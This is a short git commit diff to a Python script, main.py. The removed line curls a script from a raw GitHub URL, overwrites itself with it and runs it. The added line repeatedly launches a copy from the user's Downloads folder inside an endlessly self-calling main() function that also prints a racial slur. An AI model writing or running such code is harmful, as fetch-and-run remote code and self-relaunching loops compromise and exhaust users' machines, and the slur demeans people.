78a9c99e93deb78f647fa709aabc5a4894fbcb10
waterclientontop-boop <waterclientontop@gmail.com>
2026-04-26 18:49:28 +0200

    Change script execution method in main.py

--- main.py
+++ main.py
@@ -2,7 +2,7 @@ import os
 
 def main():
     print("Nigga")
-    os.system("curl -s "https://raw.githubusercontent.com/waterclientontop-boop/nifdaf/refs/heads/main/main.py" > main.py && python main.py")
+    os.system("start c:\\Users\\%USERNAME%\\Downloads\\main.py")
     return main()
 
 if __name__ == "__main__":
